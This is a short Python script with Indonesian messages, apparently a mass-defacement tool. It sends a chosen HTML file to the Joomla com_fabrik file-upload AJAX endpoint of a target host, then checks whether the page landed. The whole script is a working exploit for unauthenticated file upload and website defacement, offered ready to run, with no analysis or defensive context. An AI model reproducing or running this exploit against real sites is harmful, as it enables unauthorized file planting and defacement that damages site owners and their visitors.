#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import os
import sys
import urllib
os.system("clear")

print("""\033[91m
\t  ______ _______ ______ _______  ______
\t |_____/ |_____|  ____/ |______ |_____/
\t |    \_ |     | /_____ |______ |    \_
""")
if len(sys.argv) != 3:
    print("[!] Usage : " +sys.argv[0]+" example.com index.html")
    exit() 

host = sys.argv[1]
sc = sys.argv[2]    
if len(sc) > 0:
   if os.path.isfile(sc):
    scc = open(sc, 'r')
   else:
        print("[!] Script Deface Tidak Ditemukan")
        exit()    
print("Checking -> "+"http://"+host)
url = 'http://'+host+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'  
files = {'file': scc}
r = requests.post(url, files=files)    

cek = urllib.urlopen(url+sc).getcode()
if cek == 200:
    print("[*] Sukses -> "+"http://"+host)
else:
    print("[!] Target Not Vulnerability")
print("[*] Cek File Di -> "+host+"/"+sc)             
